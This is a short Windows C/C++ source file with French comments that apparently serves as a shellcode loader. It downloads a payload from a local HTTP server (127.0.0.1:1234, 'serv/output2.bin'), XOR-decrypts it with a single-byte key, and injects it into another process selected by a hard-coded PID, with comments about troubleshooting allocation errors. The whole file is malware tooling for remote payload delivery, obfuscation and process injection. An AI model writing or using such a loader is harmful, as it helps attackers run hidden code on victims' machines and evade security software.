#include <stdio.h>
#include <windows.h>
#include "utils.h"
#include "inject.h"
#include "http.h"
#include <iostream>

const unsigned char encryptionKey = 0xAA;
DWORD pid = 13828; // Si code d'erreur est virtaul alloc 5 =le logiciel n'est pas lancé |||| si code erreur 87 le PID mauvais 

int main()
{
    const SIZE_T sPayloadSize = 433;

    LPSTR shell = Data(L"127.0.0.1", 1234, L"serv/output2.bin");

    void* addr = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    size_t bytesWritten = 0;
    if (addr == 0) {
        return 1;
    }

    const size_t SHELLCODE_SIZE = sPayloadSize; //sizeof(shell);

    //const unsigned char KEY[] = {0xAA, 0x58, 0x31, 0x64}; 
    /*const size_t KEY_SIZE = sizeof(KEY);*/

    UCHAR decryptedPayload[SHELLCODE_SIZE] = {};

    for (size_t i = 0; i < sPayloadSize; ++i) {
        decryptedPayload[i] = shell[i] ^ encryptionKey;
    }

    // Injecte le shell code avant le déchiffrement
    //InjectShellcode(shell, SHELLCODE_SIZE, pid);


   // Injecte le shell code après le déchiffrement

    InjectShellcode(decryptedPayload, SHELLCODE_SIZE, pid);

}